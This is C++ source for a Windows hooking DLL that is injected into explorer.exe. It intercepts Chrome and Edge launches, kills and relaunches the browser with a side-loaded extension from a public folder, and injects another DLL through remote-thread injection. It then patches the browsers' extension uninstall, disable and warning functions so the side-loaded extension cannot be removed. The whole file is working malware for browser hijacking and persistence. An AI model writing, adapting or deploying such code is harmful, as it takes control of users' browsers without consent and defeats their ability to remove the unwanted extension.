// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <iostream>
#include <Shlwapi.h>
#include "..\cmn_detour\include\detours.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <tchar.h>
#include <TlHelp32.h>
#include <psapi.h>
#include "ProcessUtil.h"

#pragma comment(lib, "detours.lib")


BOOL lv_bExplorer = FALSE;
BOOL lv_bChrome = FALSE;
BOOL lv_bChrome_Beta = FALSE;
BOOL lv_bEdge = FALSE;

wchar_t lv_wszDLLPath[MAX_PATH];


typedef BOOL(WINAPI* FN_CreateProcessA)(
	_In_opt_ LPCSTR lpApplicationName, _Inout_opt_ LPSTR lpCommandLine,
	_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_ BOOL bInheritHandles, _In_ DWORD dwCreationFlags, _In_opt_ LPVOID lpEnvironment,
	_In_opt_ LPCSTR lpCurrentDirectory,
	_In_ LPSTARTUPINFOA lpStartupInfo, _Out_ LPPROCESS_INFORMATION lpProcessInformation
);
FN_CreateProcessA lv_orgCreateProcessA;
typedef BOOL (WINAPI*FN_CreateProcessW)(
	_In_opt_ LPCWSTR lpApplicationName, _Inout_opt_ LPWSTR lpCommandLine,
	_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_ BOOL bInheritHandles, _In_ DWORD dwCreationFlags, _In_opt_ LPVOID lpEnvironment,
	_In_opt_ LPCWSTR lpCurrentDirectory, 
	_In_ LPSTARTUPINFOW lpStartupInfo, _Out_ LPPROCESS_INFORMATION lpProcessInformation
	);
FN_CreateProcessW lv_orgCreateProcessW;

BOOL WINAPI hook_CreateProcessA(
	_In_opt_ LPCSTR lpApplicationName, _Inout_opt_ LPSTR lpCommandLine,
	_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_ BOOL bInheritHandles, _In_ DWORD dwCreationFlags, _In_opt_ LPVOID lpEnvironment,
	_In_opt_ LPCSTR lpCurrentDirectory,
	_In_ LPSTARTUPINFOA lpStartupInfo, _Out_ LPPROCESS_INFORMATION lpProcessInformation
)
{
	//OutputDebugString(L"---hook--- hook_CreateProcessA");
	if (strstr(lpCommandLine, "chrome.exe") != NULL) {
		return lv_orgCreateProcessA(lpApplicationName, (LPSTR)"--load-extension=\"E:\\tmp\\test\"",
			lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment,
			lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
	}
	return lv_orgCreateProcessA(lpApplicationName, lpCommandLine,
		lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment,
		lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
}



unsigned int TF_TERMINATE_RUNDLL(void* p) {
	HANDLE hProcess = (HANDLE)p;
	if (WaitForSingleObject(p, 1000) == WAIT_TIMEOUT) {
		TerminateProcess(p, 0);
	}
	return 0;
}

void InjectDll(HANDLE p_hProcess, LPCWSTR p_wszDllPath /*= NULL*/) {
	wchar_t wszDllPath[MAX_PATH]; memset(wszDllPath, 0, sizeof(wszDllPath));
	wcscpy_s(wszDllPath, MAX_PATH, p_wszDllPath);
	unsigned int cchDllPath = sizeof(wszDllPath);

	HMODULE hKernel32 = GetModuleHandleA("Kernelbase.dll");
	FARPROC lb = GetProcAddress(hKernel32, "LoadLibraryW");

	HANDLE hProcess = p_hProcess;

	void* pMem = VirtualAllocEx(hProcess, NULL, cchDllPath, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, pMem, wszDllPath, cchDllPath, NULL);
	HANDLE h = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lb, pMem, 0, NULL);
	WaitForSingleObject(h, 1000);
	VirtualFreeEx(hProcess, pMem, 0, MEM_RELEASE);
	CloseHandle(h);
}


BOOL WINAPI hook_CreateProcessW(
	_In_opt_ LPCWSTR lpApplicationName, _Inout_opt_ LPWSTR lpCommandLine,
	_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_ BOOL bInheritHandles, _In_ DWORD dwCreationFlags, _In_opt_ LPVOID lpEnvironment,
	_In_opt_ LPCWSTR lpCurrentDirectory,
	_In_ LPSTARTUPINFOW lpStartupInfo, _Out_ LPPROCESS_INFORMATION lpProcessInformation
)
{
	//OutputDebugString(L"---hook--- hook_CreateProcessW");
	wchar_t wszPath[MAX_PATH]; memset(wszPath, 0, sizeof(wszPath));
	if (lpApplicationName) wcscpy_s(wszPath, MAX_PATH, lpApplicationName);
	_wcslwr_s(wszPath, MAX_PATH);

	if (lpCommandLine == NULL || (wcsstr(wszPath, L"chrome.exe") == NULL && wcsstr(wszPath, L"msedge.exe") == NULL)) {
		return lv_orgCreateProcessW(lpApplicationName, lpCommandLine,
			lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment,
			lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
	}

	wchar_t wszDir[MAX_PATH]; memset(wszDir, 0, sizeof(wszDir));
	wchar_t wszDLLPath[MAX_PATH]; memset(wszDLLPath, 0, sizeof(wszDLLPath));
	wchar_t wszUnpackedPath[MAX_PATH]; memset(wszUnpackedPath, 0, sizeof(wszUnpackedPath));

	//GetModuleFileName(NULL, wszDir, MAX_PATH);
	wcscpy_s(wszDir, MAX_PATH, lv_wszDLLPath);
	wchar_t* pSlash = wcsrchr(wszDir, L'\\');
	if (pSlash != NULL)
		pSlash[0] = 0x0;


	swprintf_s(wszDLLPath, MAX_PATH, L"%s\\ntdb.dll", wszDir);
	swprintf_s(wszUnpackedPath, MAX_PATH, L"C:\\Users\\Public\\data\\ext");

	//OutputDebugString(wszDLLPath);
	//OutputDebugString(lpCommandLine);

	LPCWSTR filePath = L"C:\\Users\\Public\\data\\sss.dat";
	if (FileExists(filePath)) {
		DeleteFile(filePath);
	}
	else {
		// The substring we are searching for
		const wchar_t* searchString = L"msedge.exe";
		// Use wcsstr to find the substring within the command line
		LPWSTR found = wcsstr(lpCommandLine, searchString);
		if (found != nullptr) {
			std::wstring processName = L"msedge.exe";
			TeminateProcess(processName);
		}

		searchString = L"chrome.exe";
		// Use wcsstr to find the substring within the command line
		found = wcsstr(lpCommandLine, searchString);
		if (found != nullptr) {
			std::wstring processName = L"chrome.exe";
			TeminateProcess(processName);
		}

	}
	//.
	wchar_t wszCmd[MAX_PATH]; memset(wszCmd, 0, sizeof(wszCmd));
	//swprintf_s(wszCmd, MAX_PATH, L"%s --new-window \"https://www.bing.com\" --load-extension=\"%s\" --restore-last-session", lpCommandLine , wszUnpackedPath);
	swprintf_s(wszCmd, MAX_PATH, L"%s --load-extension=\"%s\" --restore-last-session", lpCommandLine , wszUnpackedPath);

	//OutputDebugString(wszCmd);

	DWORD dw = /*CREATE_SUSPENDED | */dwCreationFlags;
	BOOL bRet = lv_orgCreateProcessW(lpApplicationName, wszCmd,
		lpProcessAttributes, lpThreadAttributes, bInheritHandles, dw, lpEnvironment,
		lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
	if (bRet == TRUE) {

		//inject to 
		WaitForSingleObject(lpProcessInformation->hProcess, 1000);
		InjectDll(lpProcessInformation->hProcess, wszDLLPath);
		ResumeThread(lpProcessInformation->hThread);

	}
}

bool IsChromeWebStoreExtension(std::wstring& p_sExtensionID)
{
	std::wstring systemDir = GetSystemDirectoryPath();
	std::wstring loginUser = GetLoginUserName();
	std::wstring searchPath = L"";

	std::wstring	w_sSystemVolume = systemDir.substr(0, 1);

	if (lv_bChrome) {
		searchPath = w_sSystemVolume + L":\\Users\\" + loginUser + L"\\AppData\\Local\\Google\\Chrome";
	}
	if (lv_bChrome_Beta) {
		searchPath = w_sSystemVolume + L":\\Users\\" + loginUser + L"\\AppData\\Local\\Google\\Chrome Beta";
	}
	if (lv_bEdge) {
		searchPath = w_sSystemVolume + L":\\Users\\" + loginUser + L"\\AppData\\Local\\Microsoft\\Edge";
	}

	if (searchPath == L"") {
		return false;
	}
	if (FindFolderInDirectory(searchPath, p_sExtensionID)) {
		return true;
	}
	else {
		return false;
	}
}

typedef bool(__fastcall* fn_sub_7FFA456E2840)(void* p, void* a1, unsigned int a2, void* a3, void* a4);
fn_sub_7FFA456E2840 lv_org_sub_7FFA456E2840 = NULL;

//. Disable event 
typedef void(__fastcall* fn_ExtensionService__DisableExtension)(void* p, void* a1, void* a2, int a3);
fn_ExtensionService__DisableExtension lv_org_ExtensionService__DisableExtension = NULL;
void __fastcall hook_ExtensionService__DisableExtension(void* p, void* a1, void* a2, int a3)
{
	char* pPos = ((char**)a2)[0];
	std::wstring targetFolderName = charToWstring(pPos);
	if (IsChromeWebStoreExtension(targetFolderName)) {
		return lv_org_ExtensionService__DisableExtension(p, a1, a2, a3);
	}
	else {
		return;
	}
}
//. Warring Event
typedef bool(__fastcall* fn_sub_18B3A37B0)(__int64 a1, __int64 a2);
fn_sub_18B3A37B0 lv_org_sub_18B3A37B0 = NULL;
bool __fastcall hook_sub_18B3A37B0(__int64 a1, __int64 a2) {
	return false;
}


void* FindStringInDll(HMODULE hModule, const std::string& targetString) {
	MODULEINFO moduleInfo;
	GetModuleInformation(GetCurrentProcess(), hModule, &moduleInfo, sizeof(moduleInfo));

	BYTE* base = static_cast<BYTE*>(moduleInfo.lpBaseOfDll);
	SIZE_T size = moduleInfo.SizeOfImage;

	char szBuff[30]; memset(szBuff, 0, sizeof(szBuff));
	strcpy_s(szBuff, 30, targetString.c_str());
	int nSize = targetString.size();

	// Search for the string in the module's memory
	for (SIZE_T i = 0; i < size; i++) {
		if (memcmp(base + i, szBuff, nSize) == 0) {
			return base + i; // Return the address of the found string
		}
	}
	return nullptr;
}

// Function to find a function that references the string
void* FindFunctionUsingString(HMODULE hModule, void* stringAddress, void* startAddress, void* pattern, int pattern_size) {
	MODULEINFO moduleInfo;
	GetModuleInformation(GetCurrentProcess(), hModule, &moduleInfo, sizeof(moduleInfo));

	BYTE* base = static_cast<BYTE*>(moduleInfo.lpBaseOfDll);
	SIZE_T size = moduleInfo.SizeOfImage;

	void* pp = NULL;

	// Iterate through the memory to find a function that references the string

	void* pCCCC = NULL;
	for (SIZE_T i = (unsigned long long)startAddress - (unsigned long long)base;
		i < size - pattern_size; i++) {
		//.	check if the function start point
		if (memcmp(pattern, base + i, pattern_size) == 0) pCCCC = base + i;

		void* pPos = base + i;
		DWORD dwPos = unsigned long long(stringAddress) - (unsigned long long)(base + i) - 7;
		if ((*(base + i + 0) == 0x48) && (*(base + i + 1) == 0x8D) // LEA
			&& (*(base + i + 3) == (BYTE)(dwPos & 0xFF))
			&& (*(base + i + 4) == (BYTE)(dwPos >> 8) & 0xFF)
			&& (*(base + i + 5) == (BYTE)(dwPos >> 16) & 0xFF)
			&& (*(base + i + 6) == (BYTE)(dwPos >> 24) & 0xFF))
		{
			return pCCCC;// base + i; // Return the address of the function
		}
	}
	return nullptr;

}
unsigned long long findFuncAddressEdgeWarning(HMODULE hModule, void* pStart)
{
	unsigned char p1[] = {
		0x56, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xD6, 0x48, 0x89, 0xD1, 0xE8, 0xFF, 0xFF, 0xFF, 0xFF, 0x89, 0xC1, 0xB0, 0x01, 0x83
	};

	MODULEINFO moduleInfo;
	GetModuleInformation(GetCurrentProcess(), hModule, &moduleInfo, sizeof(moduleInfo));

	BYTE* base = static_cast<BYTE*>(moduleInfo.lpBaseOfDll);
	SIZE_T size = moduleInfo.SizeOfImage;

	void* pp = NULL;
	for (SIZE_T i = (unsigned long long)pStart - (unsigned long long)base;
		i < size - 64; i++) {
		//.	check if the function start point
		int nFound = 0;
		for (int j = 0; j < sizeof(p1); j++) {
			if (base[i + j] != p1[j] && p1[j] != 0xFF) {
				break;
			}
			nFound++;
		}
		if (nFound == sizeof(p1)) {
			return (unsigned long long)base + i;
		}
	}
	return 0;
}


//.
bool __fastcall hook_sub_7FFA456E2840(void* p, void* a1, unsigned int a2, void* a3, void* a4) 
{
	//.
	char* pPos = ((char**)a1)[0];
	std::wstring targetFolderName = charToWstring(pPos);

	if (IsChromeWebStoreExtension(targetFolderName)) {
		return lv_org_sub_7FFA456E2840(p, a1, a2, a3, a4);
	}
	else {
		return false;
	}
}

BOOL getDllPath(const wchar_t* p_wszName, wchar_t* p_wszPath) {
	BOOL bRet = FALSE;
	wchar_t wszDir[MAX_PATH]; memset(wszDir, 0, sizeof(wszDir));
	GetModuleFileName(NULL, wszDir, MAX_PATH);
	wchar_t* pPos = wcsrchr(wszDir, L'\\');
	pPos[0] = 0;

	wchar_t wszFind[MAX_PATH]; 
	memset(wszFind, 0, sizeof(wszFind));
	swprintf_s(wszFind, MAX_PATH, L"%s\\%s", wszDir, p_wszName);
	if (GetFileAttributes(wszFind) != INVALID_FILE_ATTRIBUTES) {
		wcscpy_s(p_wszPath, MAX_PATH, wszFind);
		return TRUE;
	}
	
	memset(wszFind, 0, sizeof(wszFind));
	swprintf_s(wszFind, MAX_PATH, L"%s\\*", wszDir);

	WIN32_FIND_DATA data;
	HANDLE hFind = FindFirstFile(wszFind, &data);
	BOOL bSts = (hFind != INVALID_HANDLE_VALUE);

	while (bSts) {
		bSts = FindNextFileW(hFind, &data);
		if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			swprintf_s(wszFind, L"%s\\%s\\%s", wszDir, data.cFileName, p_wszName);
			if (GetFileAttributes(wszFind) != INVALID_FILE_ATTRIBUTES) {
				wcscpy_s(p_wszPath, MAX_PATH, wszFind);
				bRet = TRUE;
				break;
			}
		}
	}

	if (hFind != INVALID_HANDLE_VALUE) {
		FindClose(hFind);
	}
	return bRet;
}
////////////////////////////// edge
unsigned long long findFuncAddressEdgeUninstall(HMODULE hModule, void* pStart)
{
	unsigned char p[] = { 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x81, 0xEC };

	void* pAddr = FindStringInDll(hModule, "Extensions.UninstallType");
	void* funcAddress = FindFunctionUsingString(hModule, pAddr, pStart, p, sizeof(p));
	return (unsigned long long)funcAddress;
}


unsigned long long findFuncAddressEdgeDisable(HMODULE hModule, void* pStart)
{
	MODULEINFO moduleInfo;
	GetModuleInformation(GetCurrentProcess(), hModule, &moduleInfo, sizeof(moduleInfo));

	BYTE* base = static_cast<BYTE*>(moduleInfo.lpBaseOfDll);
	SIZE_T size = moduleInfo.SizeOfImage;

	void* pp = NULL;

	//41 57 41 56 56 57 53 48  83 EC 20 44 89 CF 4C 89
	//C3 49 89 D6 48 89 CE E8  XX XX XX XX 48 8B 0D XX
	//XX XX XX 48 85 C9 0F 84  9E 00 00 00 48 8B 01 48
	//8B 40 40 FF 15

	unsigned char pPattern[] = {
			0x41, 0x57, 0x41, 0x56, 0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x44, 0x89, 0xCF, 0x4C, 0x89,
			0xC3, 0x49, 0x89, 0xD6, 0x48, 0x89, 0xCE, 0xE8
	};
	//0xDB, 0x15, 0xA1, 0x06
	unsigned char pPattern1[] = {
			0x48, 0x8B, 0x0D };
	//0xDB, 0x15, 0xA1, 0x06
	unsigned char pPattern2[] = {
			0x48, 0x85, 0xC9, 0x0F, 0x84, 0x9E, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x01, 0x48, 0x8B, 0x40, 0x40, 0xFF, 0x15
	};

	// Iterate through the memory to find a function that references the string

	void* pCCCC = NULL;
	for (SIZE_T i = (unsigned long long)pStart - (unsigned long long)base;
		i < size - sizeof(pPattern) - 4 - sizeof(pPattern1); i++) {
		//.        check if the function start point
		if (memcmp(base + i, pPattern, sizeof(pPattern)) == 0
			&& memcmp(base + i + sizeof(pPattern) + 4, pPattern1, sizeof(pPattern1)) == 0
			&& memcmp(base + i + sizeof(pPattern) + sizeof(pPattern1) + 8, pPattern2, sizeof(pPattern2)) == 0)
		{
			return (unsigned long long)base + i;
		}
	}
	return 0;
}



////////////////////////////// chrome
unsigned long long findFuncAddressChromeDisable(FARPROC pMain)
{
	unsigned long lStart = 0x5590000;
	unsigned int lSize = 0x10000;
	unsigned long long lRet = 0;
	HANDLE hProc = GetCurrentProcess();
	unsigned char* pBuff = (unsigned char*)malloc(lSize);
	SIZE_T t;
	ReadProcessMemory(hProc, (void*)((unsigned long long)pMain + lStart), pBuff, lSize, &t);
	unsigned char pPattern[] = {
		0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x30, 0x44, 0x89, 0xC3, 0x48, 0x89, 0xD7, 0x48, 0x89, 0xCE,
		0x48, 0x8B, 0x05 };
	unsigned char pPattern2[] = {/*0x09, 0x2C, 0xF4, 0x06, */
		0x48, 0x31, 0xE0, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48,
		0x8B, 0x49, 0x38, 0x41, 0xB8, 0x1F, 0x00, 0x00
	};
/*
	unsigned char pPattern1[] = {
		0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x30, 0x44, 0x89, 0xC3, 0x48, 0x89, 0xD7, 0x48, 0x89, 0xCE,
		0x48, 0x8B, 0x05, 0xF9, 0x2C, 0xF4, 0x06, 0x48, 0x31, 0xE0, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48,
		0x8B, 0x49, 0x38, 0x41, 0xB8, 0x1F, 0x00, 0x00
	};
*/
	for (int i = 0; i < lSize - sizeof(pPattern); i++) {
		if (memcmp(&pBuff[i], pPattern, sizeof(pPattern)) == 0 && memcmp(&pBuff[i+sizeof(pPattern) + 4], pPattern2, sizeof(pPattern2)) == 0) {
			lRet = (unsigned long long)pMain + lStart + i;
			break;
		}
	}
	free(pBuff);
	return lRet;
}




unsigned long long findFuncAddressChromeUninstall(HMODULE hModule, void* pStart)
{
	unsigned char p[] = { 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x81, 0xEC, 0x38 };

	void* pAddr = FindStringInDll(hModule, "Extensions.UninstallType");
	void* funcAddress = FindFunctionUsingString(hModule, pAddr, pStart, p, sizeof(p));
	return (unsigned long long)funcAddress;
}
unsigned long long findFuncAddressChromeDisable(HMODULE hModule, void* pStart)
{
	MODULEINFO moduleInfo;
	GetModuleInformation(GetCurrentProcess(), hModule, &moduleInfo, sizeof(moduleInfo));

	BYTE* base = static_cast<BYTE*>(moduleInfo.lpBaseOfDll);
	SIZE_T size = moduleInfo.SizeOfImage;

	void* pp = NULL;

	unsigned char pPattern[] = {
			0x41, 0x57, 0x41, 0x56, 0x56, 0x57, 0x53, 0x48,
			0x83, 0xEC, 0x20, 0x44, 0x89, 0xCE, 0x4C, 0x89,
			0xC7, 0x49, 0x89, 0xD6, 0x48, 0x89, 0xCB, 0x31,
			0xC9, 0xE8 };
	//B2 10 23 FD
	unsigned char pPattern1[] = {
			0x84, 0xC0, 0x74, 0x61, 0x48, 0x8B, 0x8B, 0xF8,
			0x01, 0x00, 0x00, 0x48, 0x89, 0xFA, 0x41, 0xB8,
			0x1F, 0x00, 0x00, 0x00, 0xE8 };

	// Iterate through the memory to find a function that references the string

	void* pCCCC = NULL;
	for (SIZE_T i = (unsigned long long)pStart - (unsigned long long)base;
		i < size - sizeof(pPattern) - 4 - sizeof(pPattern1); i++) {
		//.        check if the function start point
		if (memcmp(base + i, pPattern, sizeof(pPattern)) == 0
			&& memcmp(base + i + sizeof(pPattern) + 4, pPattern1, sizeof(pPattern1)) == 0)
		{
			return (unsigned long long)base + i;
		}
	}
	return 0;
}



void hook_functions(void) {

	MyWriteLog("--HookDLL ... hook_functions Start");

	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());

	if (lv_bChrome || lv_bEdge) {

		wchar_t wszDllPath[MAX_PATH]; memset(wszDllPath, 0, sizeof(wszDllPath));
		if (lv_bChrome) {
			MyWriteLog("--HookDLL ... hook_functions lv_bChrome");
			getDllPath(L"chrome.dll", wszDllPath);
		}

		if (lv_bEdge) {
			MyWriteLog("--HookDLL ... hook_functions lv_bEdge");
			getDllPath(L"msedge.dll", wszDllPath);
		}
		HMODULE hModChrome = LoadLibraryW(wszDllPath);
		FARPROC org_main = GetProcAddress(hModChrome, "ChromeMain");
		if (lv_bChrome) {
			MyWriteLog("--HookDLL ... hook_functions lv_bChrome Engine");
			lv_org_sub_7FFA456E2840 = (fn_sub_7FFA456E2840)findFuncAddressChromeUninstall(hModChrome, org_main);
			lv_org_ExtensionService__DisableExtension = (fn_ExtensionService__DisableExtension)findFuncAddressChromeDisable(hModChrome, lv_org_sub_7FFA456E2840);
		}
		if (lv_bEdge) {
			MyWriteLog("--HookDLL ... hook_functions lv_bEdge Engine");
			lv_org_sub_18B3A37B0 = (fn_sub_18B3A37B0)findFuncAddressEdgeWarning(hModChrome, org_main);
			lv_org_sub_7FFA456E2840 = (fn_sub_7FFA456E2840)findFuncAddressEdgeUninstall(hModChrome, org_main);
			lv_org_ExtensionService__DisableExtension = (fn_ExtensionService__DisableExtension)findFuncAddressEdgeDisable(hModChrome, lv_org_sub_7FFA456E2840);

		}
		//. Remove event
		if (lv_org_sub_7FFA456E2840 != NULL) {
			MyWriteLog("--HookDLL ... hook_functions Remove event DetourAttach");
			DetourAttach(&(PVOID&)lv_org_sub_7FFA456E2840, hook_sub_7FFA456E2840);
		}
		//. Disable event
		if (lv_org_ExtensionService__DisableExtension != NULL) {
			MyWriteLog("--HookDLL ... hook_functions Disable event DetourAttach");
			DetourAttach(&(PVOID&)lv_org_ExtensionService__DisableExtension, hook_ExtensionService__DisableExtension);
		}
		//. Warring event
		if (lv_org_sub_18B3A37B0 != NULL) {
			MyWriteLog("--HookDLL ... hook_functions Warring event DetourAttach");
			DetourAttach(&(PVOID&)lv_org_sub_18B3A37B0, hook_sub_18B3A37B0);
		}

	}

	if (lv_bExplorer) {
//		OutputDebugString(L"------hook  hook_functions lv_bExplorer");

		HMODULE hModKernel = LoadLibraryW(L"Kernelbase.dll");
		lv_orgCreateProcessA = (FN_CreateProcessA)GetProcAddress(hModKernel, "CreateProcessA");
		lv_orgCreateProcessW = (FN_CreateProcessW)GetProcAddress(hModKernel, "CreateProcessW");
		DetourAttach(&(PVOID&)lv_orgCreateProcessA, hook_CreateProcessA);
		DetourAttach(&(PVOID&)lv_orgCreateProcessW, hook_CreateProcessW);
	}

	if (DetourTransactionCommit() != NO_ERROR) {
//		OutputDebugStringW(L"error ... DetourTransactionCommit");
		MyWriteLog("--HookDLL ... hook_functions error(DetourTransactionCommit)");
	}

	MyWriteLog("--HookDLL ... hook_functions End");
	
	return;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	wchar_t wszPath[MAX_PATH]; 
	memset(wszPath, 0, sizeof(wszPath));
	GetModuleFileName(NULL, wszPath, MAX_PATH);
	_wcslwr_s(wszPath, MAX_PATH);


	memset(lv_wszDLLPath, 0, sizeof(lv_wszDLLPath));
	GetModuleFileName(hModule, lv_wszDLLPath, MAX_PATH);

	//MyWriteLog("--HookDLL ... DllMain start");


	if (wcsstr(wszPath, L"explorer.exe") != NULL) {
		//MyWriteLog("--HookDLL ... DllMain explorer");
		lv_bExplorer = TRUE;
	}
	else {
		lv_bExplorer = FALSE;
	}
	if (wcsstr(wszPath, L"chrome.exe") != NULL) {
		//MyWriteLog("--HookDLL ... DllMain chrome");
		lv_bChrome = TRUE;
		if (wcsstr(wszPath, L"chrome beta") != NULL) {
			lv_bChrome_Beta = TRUE;
		}
	}
	else {
		lv_bChrome = FALSE;
		lv_bChrome_Beta = FALSE;
	}
	if (wcsstr(wszPath, L"msedge.exe") != NULL) {
		//MyWriteLog("--HookDLL ... DllMain msedge");
		lv_bEdge = TRUE;
	}
	else {
		lv_bEdge = FALSE;
	}
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		//MyWriteLog("--HookDLL ... DllMain DLL_PROCESS_ATTACH");
		hook_functions();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

